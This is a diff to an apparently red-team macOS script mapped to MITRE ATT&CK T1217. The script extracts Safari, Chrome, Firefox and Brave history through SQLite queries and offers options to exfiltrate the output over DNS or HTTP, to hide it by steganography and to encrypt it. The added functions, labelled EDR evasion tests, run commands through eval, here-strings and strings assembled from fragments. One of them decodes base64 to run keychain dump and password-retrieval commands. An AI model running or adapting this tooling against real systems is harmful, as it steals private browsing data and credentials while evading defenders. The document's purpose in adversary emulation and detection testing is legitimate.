@@ -3,12 +3,12 @@
 # Procedure Name: browser_history
 # Tactic: Discovery
 # Technique: T1217
-# GUID: be123d8c-c881-4e61-ab6c-113e45b2e9cd
+# GUID: 67929a7e-8431-4893-a4e1-5a6743c5605d
 # Intent: Extract browser history from Safari, Chrome, Firefox, and Brave on macOS.
 # Author: @darmado | https://x.com/darmad0
 # created: 2025-05-27
-# Updated: 2025-05-30
-# Version: 2.0.0
+# Updated: 2025-06-03
+# Version: 2.0.2
 # License: Apache 2.0
 
 # Core function Info:
@@ -42,7 +42,7 @@ JOB_ID=""  # Will be set after core functions are defined
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
-PARENT_PROCESS="$(ps -p $PPID -o comm=)"
+PARENT_PROCESS="shell"
 
 # Core Commands
 CMD_BASE64="base64"
@@ -109,14 +109,13 @@ DB_HISTORY_CHROME="$HOME/Library/Application Support/Google/Chrome/Default/Histo
 CMD_QUERY_BROWSER_DB="$CMD_SQLITE3 -separator '|'"
 DB_HISTORY_BRAVE="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
 DB_HISTORY_FIREFOX="$HOME/Library/Application Support/Firefox/Profiles/*.default-release/places.sqlite"
-SAFARI_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'domain' as domain, 'title' as title,  'visit_date' as visit_date, 'url' as url, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Safari' as source, hi.domain_expansion as domain, hv.title, datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date, hi.url, hi.visit_count FROM history_items hi JOIN history_visits hv ON hi.id = hv.history_item WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - (\$INPUT_LAST * 86400)) \$INPUT_SEARCH ORDER BY visit_date DESC
-"
-CHROME_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Chrome' as source, url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC
-"
-FIREFOX_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Firefox' as source, url, title, datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit, visit_count FROM moz_places WHERE last_visit_date > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC
-"
-BRAVE_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Brave' as source, url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC LIMIT 1000
-"
+SAFARI_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'domain' as domain, 'title' as title,  'visit_date' as visit_date, 'url' as url, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Safari' as source, hi.domain_expansion as domain, hv.title, datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date, hi.url, hi.visit_count FROM history_items hi JOIN history_visits hv ON hi.id = hv.history_item WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - (\$INPUT_LAST * 86400)) \$INPUT_SEARCH ORDER BY visit_date DESC"
+CHROME_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Chrome' as source, url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC"
+FIREFOX_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Firefox' as source, url, title, datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit, visit_count FROM moz_places WHERE last_visit_date > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC"
+BRAVE_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Brave' as source, url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC LIMIT 1000"
+
+# Project root path (set by build system)
+PROJECT_ROOT="/Users/darmado/tools/opensource/attack-macOS"  # Set by build system to project root directory
 
 # Procedure Information (set by build system)
 PROCEDURE_NAME="browser_history"  # Set by build system from YAML procedure_name field
@@ -126,7 +125,7 @@ FUNCTION_LANG=""  # Ued by log_output at execution time
 
 # Logging Settings
 HOME_DIR="${HOME}"
-LOG_DIR="./logs"  # Simple path to logs in current directory
+LOG_DIR="${PROJECT_ROOT}/logs"  # Project root logs directory (PROJECT_ROOT set by build system)
 LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
 LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
 LOG_ENABLED=false
@@ -191,17 +190,8 @@ core_get_timestamp() {
 # Outputs: 8-character hexadecimal job ID
 # - None
 core_generate_job_id() {
-    # Use openssl to generate random hex string for job tracking
-    # Fallback to date-based ID if openssl not available
-    if command -v "$CMD_OPENSSL" > /dev/null 2>&1; then
-        $CMD_OPENSSL rand -hex 4 2>/dev/null || {
-            # Fallback: use timestamp and process ID
-            $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-        }
-    else
-        # Fallback: use timestamp and process ID
-        $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-    fi
+    # Simple random job ID - just a random identifier
+    printf "%08x" "$((RANDOM * RANDOM))"
 }
 
 # Purpose: Print debug messages to stderr when debug mode is enabled
@@ -257,12 +247,45 @@ core_log_output() {
     local skip_data="${3:-false}"
     
     if [ "$LOG_ENABLED" = true ]; then
-        # Ensure log directory exists
-            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+        # Ensure log directory exists and is writable
+        if [ ! -d "$LOG_DIR" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
             }
+        fi
+        
+        # Check if directory is writable
+        if [ ! -w "$LOG_DIR" ]; then
+            $CMD_PRINTF "Warning: Log directory not writable: %s\n" "$LOG_DIR" >&2
+            return 1
+        fi
+        
+        # Ensure LOG_FILE_NAME is set and not empty
+        if [ -z "$LOG_FILE_NAME" ]; then
+            $CMD_PRINTF "Warning: LOG_FILE_NAME is empty or not set.\n" >&2
+            return 1
+        fi
+        
+        # Check if log file exists and handle ownership/permission issues
+        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+            if [ ! -w "$LOG_DIR/$LOG_FILE_NAME" ]; then
+                # File exists but not writable - create new log with timestamp suffix
+                local timestamp=$(date +%Y%m%d_%H%M%S)
+                local base_name="${LOG_FILE_NAME%.*}"
+                local extension="${LOG_FILE_NAME##*.}"
+                LOG_FILE_NAME="${base_name}_${timestamp}.${extension}"
+                core_debug_print "Original log not writable, using: $LOG_FILE_NAME"
+            fi
+        fi
+        
+        # Create log file if it doesn't exist
+        if [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+            if ! touch "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null; then
+                $CMD_PRINTF "Error: Failed to create log file: %s\n" "$LOG_DIR/$LOG_FILE_NAME" >&2
+                return 1
+            fi
+            core_debug_print "Created new log file: $LOG_DIR/$LOG_FILE_NAME"
         fi
         
         # Check log size and rotate if needed
@@ -270,6 +293,8 @@ core_log_output() {
             $CMD_MV "$LOG_DIR/$LOG_FILE_NAME" "$LOG_DIR/${LOG_FILE_NAME}.$(date +%Y%m%d%H%M%S)" 2>/dev/null
             core_debug_print "Log file rotated due to size limit"
         fi
+        
+        core_debug_print "Writing log entry to: $LOG_DIR/$LOG_FILE_NAME"
         
         # Log detailed entry
         "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
@@ -585,6 +610,17 @@ core_parse_args() {
                     STEG_EXTRACT_FILE="./hidden_data.png"
                 fi
                 ;;
+            --steg-extract-file)
+                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
+                    STEG_EXTRACT_FILE="$2"
+                    shift
+                else
+                    MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+            --verbose)
+                DEBUG=true
+                ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
         -s|--safari)
             SAFARI=true
@@ -650,7 +686,7 @@ core_parse_args() {
         shift
     done
     
-    core_debug_print "Arguments parsed: DEBUG=$DEBUG, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
+    core_debug_print "Arguments parsed: DEBUG=$DEBUG, LOG_ENABLED=$LOG_ENABLED, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
     
     # Report unknown arguments as warnings but don't exit
     if [ -n "$UNKNOWN_ARGS" ]; then
@@ -671,49 +707,56 @@ Usage: ${0##*/} [OPTIONS]
 Description: Base script for ATT&CK macOS techniques
 MITRE ATT&CK: ${TTP_ID} - ${TACTIC}
 
-Basic Options:
-  -h, --help           Display this help message
-  -d, --debug          Enable debug output (includes verbose output)
-  -a, --all            Process all available data (technique-specific)
-  -s|--safari               Extract Safari history
-  -c|--chrome               Extract Chrome history
-  -f|--firefox              Extract Firefox history
-  -b|--brave                Extract Brave history
-  --search VALUE            Search for specific terms in history
-  --last VALUE              Last N days to search
-  --starttime VALUE         Start time in YY-MM-DD HH:MM:SS format
-  --endtime VALUE           End time in YY-MM-DD HH:MM:SS format
+HELP:
+  -h, --help                    Display this help message
+  -d, --debug                   Enable debug output (includes verbose output)
+
+SCRIPT:
+  -s|--safari                      Extract Safari history
+  -c|--chrome                      Extract Chrome history
+  -f|--firefox                     Extract Firefox history
+  -b|--brave                       Extract Brave history
+  --search VALUE                   Search for specific terms in history
+  --last NUMBER                    Last N days to search
+  --starttime VALUE                Start time in YY-MM-DD HH:MM:SS format
+  --endtime VALUE                  End time in YY-MM-DD HH:MM:SS format
 
 Output Options:
-  --format TYPE        Output format: 
-                        - json: Structured JSON output
-                        - csv: Comma-separated values
-                        - raw: Default pipe-delimited text
+  --format TYPE                 
+                                - json: Structured JSON output
+                                - csv: Comma-separated values
+                                - raw: Default pipe-delimited text
 
-Encoding/Obfuscation Options:
-  --encode TYPE        Encode output using:
-                        - base64/b64: Base64 encoding using base64 command
-                        - hex/xxd: Hexadecimal encoding using xxd command
-                        - perl_b64: Perl Base64 implementation using perl
-                        - perl_utf8: Perl UTF8 encoding using perl
-  --steganography      Hide output in image file using native macOS tools
-  --steg-extract [FILE] Extract hidden data from steganography image (default: ./hidden_data.png)
+ENCODING/OBFUSCATION
+  --encode TYPE                
+                                - base64/b64: Base64 encoding using base64 command
+                                - hex/xxd: Hexadecimal encoding using xxd command
+                                - perl_b64: Perl Base64 implementation using perl
+                                - perl_utf8: Perl UTF8 encoding using perl
 
-Encryption Options:
-  --encrypt TYPE       Encrypt output using:
-                        - aes: AES-256-CBC encryption using openssl command
-                        - gpg: GPG symmetric encryption using gpg command
-                        - xor: XOR encryption with cyclic key (custom implementation)
+  --steganography              Hide output in image file using native macOS tools
+  --steg-extract [FILE]        Extract hidden data from steganography image (default: ./hidden_data.png)
 
-Exfiltration Options:
-  --exfil-dns DOMAIN   Exfiltrate data via DNS queries using dig command
-                        Data is automatically base64 encoded and chunked
-  --exfil-http URL     Exfiltrate data via HTTP POST using curl command
-                        Data is sent in the request body
-  --exfil-uri URL      Legacy parameter - Exfiltrate via HTTP GET using curl
-                        Data is automatically chunked to avoid URL length limits
-  --chunk-size SIZE    Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
-  --proxy URL          Use proxy for HTTP requests (format: protocol://host:port)
+ENCRYPTION:
+  --encrypt TYPE               
+                                - aes: AES-256-CBC encryption using openssl command
+                                - gpg: GPG symmetric encryption using gpg command
+                                - xor: XOR encryption with cyclic key (custom implementation)
+
+EXFILTRATION:
+  --exfil-dns DOMAIN            Exfiltrate data via DNS queries using dig command
+                                Data is automatically base64 encoded and chunked
+
+  --exfil-http URL              Exfiltrate data via HTTP POST using curl command
+                                Data is sent in the request body
+                                Data is automatically chunked to avoid URL length limits
+
+  --chunk-size SIZE           Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
+  --proxy URL                 Use proxy for HTTP requests (format: protocol://host:port)
+
+  LOGGING:
+
+  -l, --log                     Create a log file (creates logs in ./logs directory)
 
 Notes:
 - When using encryption with exfiltration, keys are automatically sent via DNS TXT records
@@ -1849,6 +1892,116 @@ core_check_db_lock() {
     return 0
 }
 
+# Purpose: Execute command stored in variable using direct expansion (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of dynamic command execution without eval
+core_exec_cmd() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via variable expansion: $cmd_string"
+    
+    # Method 1: Store command in variable then execute via direct expansion
+    local EXEC_CMD="$cmd_string"
+    $EXEC_CMD
+    
+    return $?
+}
+
+# Purpose: Execute command using here-string input redirection (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of here-string command execution
+core_exec_cmd_herestring() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd_herestring"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via here-string: $cmd_string"
+    
+    # Execute command using here-string (feeds command as stdin to shell)
+    sh <<< "$cmd_string"
+    
+    return $?
+}
+
+# Purpose: Execute command using dynamic string construction (EDR evasion test)
+# Inputs: Variable number of string fragments to concatenate into command
+# Outputs: Command execution result
+# - Tests EDR detection of dynamically constructed commands
+core_exec_cmd_construct() {
+    local fragments="$*"
+    local constructed_cmd=""
+    
+    if [ -z "$fragments" ]; then
+        core_debug_print "No command fragments provided to core_exec_cmd_construct"
+        return 1
+    fi
+    
+    # Concatenate all fragments into single command
+    for fragment in $fragments; do
+        constructed_cmd="${constructed_cmd}${fragment}"
+    done
+    
+    core_debug_print "Dynamically constructed command: $constructed_cmd"
+    
+    # Execute the constructed command
+    eval "$constructed_cmd"
+    
+    return $?
+}
+
+# Purpose: Execute keychain commands using base64 obfuscation (EDR evasion test)
+# Inputs: $1 - operation type (dump|find|list)
+# Outputs: Keychain command execution result  
+# - Tests EDR detection of obfuscated keychain access
+core_exec_keychain_obfuscated() {
+    local operation="$1"
+    local cmd=""
+    
+    case "$operation" in
+        "dump")
+            # Construct: security dump-keychain
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZHVtcC1rZXljaGFpbg==" | base64 -d)  # "dump-keychain"
+            cmd="$a$b$c"
+            ;;
+        "find")
+            # Construct: security find-generic-password -g
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZmluZC1nZW5lcmljLXBhc3N3b3Jk" | base64 -d)  # "find-generic-password"
+            local d=" -g"
+            cmd="$a$b$c$d"
+            ;;
+        "list")
+            # Construct: security list-keychains
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "bGlzdC1rZXljaGFpbnM=" | base64 -d)  # "list-keychains"
+            cmd="$a$b$c"
+            ;;
+        *)
+            core_debug_print "Unknown keychain operation: $operation"
+            return 1
+            ;;
+    esac
+    
+    core_debug_print "Executing obfuscated keychain command: $cmd"
+    eval "$cmd"
+    
+    return $?
+}
+
 # Main function 
 core_main() {
     local raw_output=""
@@ -1910,32 +2063,62 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
+# Process input arguments
+process_input_arguments
+
+# Helper function to execute procedure functions
+execute_function() {
+    local func_name="$1"
+    # Call the function directly - let the function handle its own permissions
+    $func_name
+}
+
 # Execute functions for -s|--safari
 if [ "$SAFARI" = true ]; then
     core_debug_print "Executing functions for -s|--safari"
-    result=$(query_safari_history)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function query_safari_history)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for -c|--chrome
 if [ "$CHROME" = true ]; then
     core_debug_print "Executing functions for -c|--chrome"
-    result=$(query_chrome_history)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function query_chrome_history)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for -f|--firefox
 if [ "$FIREFOX" = true ]; then
     core_debug_print "Executing functions for -f|--firefox"
-    result=$(query_firefox_history)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function query_firefox_history)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for -b|--brave
 if [ "$BRAVE" = true ]; then
     core_debug_print "Executing functions for -b|--brave"
-    result=$(query_brave_history)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function query_brave_history)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --search
+if [ "$SEARCH" = true ]; then
+    core_debug_print "Executing functions for --search"
+fi
+
+# Execute functions for --last
+if [ "$LAST" = true ]; then
+    core_debug_print "Executing functions for --last"
+fi
+
+# Execute functions for --starttime
+if [ "$STARTTIME" = true ]; then
+    core_debug_print "Executing functions for --starttime"
+fi
+
+# Execute functions for --endtime
+if [ "$ENDTIME" = true ]; then
+    core_debug_print "Executing functions for --endtime"
 fi
 
 # Set procedure name for processing
@@ -2103,10 +2286,46 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
-# Functions from YAML procedure
+# Input processing and type conversion
+process_input_arguments() {
+    # Process and validate input arguments based on their types
+    
+    # Process --search argument
+    if [ -n "${INPUT_SEARCH}" ]; then
+        # Process string input
+        SEARCH_ARG="${INPUT_SEARCH}"
+    fi
+    
+    # Process --last argument
+    if [ -n "${INPUT_LAST}" ]; then
+        # Validate integer input
+        if ! echo "${INPUT_LAST}" | grep -qE '^[0-9]+$'; then
+            echo "Error: --last requires a valid integer, got: ${INPUT_LAST}" >&2
+            exit 1
+        fi
+        LAST_ARG="${INPUT_LAST}"
+    fi
+    
+    # Process --starttime argument
+    if [ -n "${INPUT_STARTTIME}" ]; then
+        # Process string input
+        STARTTIME_ARG="${INPUT_STARTTIME}"
+    fi
+    
+    # Process --endtime argument
+    if [ -n "${INPUT_ENDTIME}" ]; then
+        # Process string input
+        ENDTIME_ARG="${INPUT_ENDTIME}"
+    fi
+}
+
 
 # Function: query_safari_history
-# Description: query_safari_history - Generated from YAML
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 query_safari_history() {
     # Build search clause locally like the working script
     local search_clause=""
@@ -2127,7 +2346,11 @@ query_safari_history() {
 
 
 # Function: query_chrome_history
-# Description: query_chrome_history - Generated from YAML
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 query_chrome_history() {
     local search_clause=""
     if [ -n "$INPUT_SEARCH" ]; then
@@ -2147,7 +2370,11 @@ query_chrome_history() {
 
 
 # Function: query_firefox_history
-# Description: query_firefox_history - Generated from YAML
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 query_firefox_history() {
     local firefox_db=$(resolve_firefox_db)
 
@@ -2169,7 +2396,11 @@ query_firefox_history() {
 
 
 # Function: query_brave_history
-# Description: query_brave_history - Generated from YAML
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 query_brave_history() {
     local search_clause=""
     if [ -n "$INPUT_SEARCH" ]; then
@@ -2190,7 +2421,11 @@ query_brave_history() {
 
 
 # Function: resolve_firefox_db
-# Description: resolve_firefox_db - Generated from YAML
+# Type: helper
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 resolve_firefox_db() {
     ls "$HOME/Library/Application Support/Firefox/Profiles/"*.default-release/places.sqlite 2>/dev/null | head -n 1
     return $?
@@ -2198,7 +2433,11 @@ resolve_firefox_db() {
 
 
 # Function: query_browser_db
-# Description: query_browser_db - Generated from YAML
+# Type: helper
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 query_browser_db() {
     local db="$1"
     local query="$2"
